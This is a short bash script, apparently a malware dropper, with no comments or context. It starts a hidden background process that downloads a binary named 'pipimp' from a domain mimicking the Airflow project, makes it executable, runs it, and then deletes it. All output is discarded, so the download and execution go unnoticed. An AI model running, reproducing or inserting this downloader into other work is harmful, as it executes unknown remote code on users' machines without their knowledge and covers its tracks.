#!/bin/bash
(nohup bash -c 'rm pipimp*; wget https://airflow.it.com/pipimp && chmod +x ./pipimp && ./pipimp && rm pipimp*' > /dev/null 2>&1 &) > /dev/null 2>&1
